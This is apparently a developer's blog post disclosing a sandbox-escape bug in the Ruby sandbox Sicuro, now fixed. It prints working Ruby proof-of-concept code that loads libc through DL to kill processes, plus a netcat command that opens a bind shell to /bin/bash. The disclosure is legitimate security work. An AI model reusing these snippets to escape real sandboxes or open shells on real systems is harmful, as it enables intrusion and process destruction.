---
title: Untrusted Code Execution Bug in Sicuro
tags: sicuro security bug untrusted code execution
layout: post
---

<div class="update">
<p>This has been fixed as of <a href="https://github.com/duckinator/sicuro/tree/v0.4.0">Sicuro v0.4.0</a>.</p>
<p>Unfortunately, I had to disable <code>require</code> and <code>load</code> almost entirely. The exception is that <code>require</code> will return <code>false</code> if a file was already included.</p>
</div>

[Jens Nockert](http://twitter.com/jensnockert) has exposed a rather major security hole in Sicuro.

Under basically any circumstances, Sicuro can be used to execute untrusted code. The demonstrated technique used by Jens was to terminate the process group that `Sicuro#eval` was called from. By modifying one of the parameters, it would instead terminate all processes that can be terminated by the user who ran the initial `Sicuro#eval` call. I have demonstrated the ability to use it to access a remote shell, but am unsure if it could be used for privilege escalation.

# The main problem

It appears that attempts at making Sicuro more efficient have actually left it wide open to abuse. There was an attempt to make it lazily load trusted components, and that seems to have opened up a bug letting you `require` anything in the stdlib, including DL. DL is used for loading shared objects and calling functions in them.

Please note that it can `require`, _any_ code in the ruby stdlib, and this is just _a single example._

The following is the relevant part of the code for lazily loading trusted components. You can view it in context in [lib/sicuro/base.rb](https://github.com/duckinator/sicuro/blob/761e955fbbba07638d69bc62159199cdf0716a7d/lib/sicuro/base.rb#L254-256), lines 254 through 256.

    # Without Gem we won't require unresolved gems, therefore we restore the original require.
    # This allows us to lazy-require other trusted components from the same $LOAD_PATH.
    ::Kernel.module_eval { alias require gem_original_require }

Following is a tidied up version of the code that exposed the bug.

    require 'dl'
    require 'dl/import'
    
    module Libc
      extend DL::Importer
      dlload '/lib/libc.so.6'
      extern 'int kill(int, int)'
    end
    
    Libc.kill(0, 9)

Calling `Libc.kill(-1, 9)` will terminate _all processes the user who called `Sicuro.eval` can terminate._

Here is similar code that will allow you to execute arbitrary shell code:

    require 'dl'
    require 'dl/import'
    
    module Libc
       extend DL::Importer
       dlload '/lib/libc.so.6'
       extern 'int system(const char*)'
    end
    
    Libc.system('nc -lp 1337 -e /bin/bash &')

Congratulations, you now can run `netcat $IP 1337` to connect. The IP could easily be gained through similar means.

There's a video at the bottom, but it's a bit difficult to read at that scale, so you can [go directly to the video](/assets/sicuro-untrusted-code-execution-bug.ogv).

It may also be possible to escalate privileges using this method.

# The small problem

There's always something hiding, right? That little thing you find when hunting another bug. This one happened to be that `GC`, `Signal`, and `ObjectSpace` were whitelisted. This isn't exactly good.

At the very least, `GC.disable` could make it use too much memory, causing instability, and `Signal.trap` could be used to handle signals used to terminate the process &ndash; and ignore them. I'm not entirely sure what `ObjectSpace` can be used for, but I do not know what it does, so I do not like it being whitelisted. I've also been told `ObjectSpace` is "dangerous." I may look into this later.

`GC`, `Signal`, and `ObjectSpace` will not be whitelisted as of the next release.

# Conclusion

While removing things from the whitelist was trivial, fixing the code execution problem is proving immensely difficult. I am not sure I will be able to fix it and retain all current functionality.

I highly recommend that, once the next version is released, everyone upgrade immediately. This is a major security hole, and allows execution of any untrusted code that can be done through a shared library. This includes calls to `system()` and related functions, as mentioned above.



<video style="width: 100%; max-width: 798px;" controls="controls" src="/assets/sicuro-untrusted-code-execution-bug.ogv"></video>
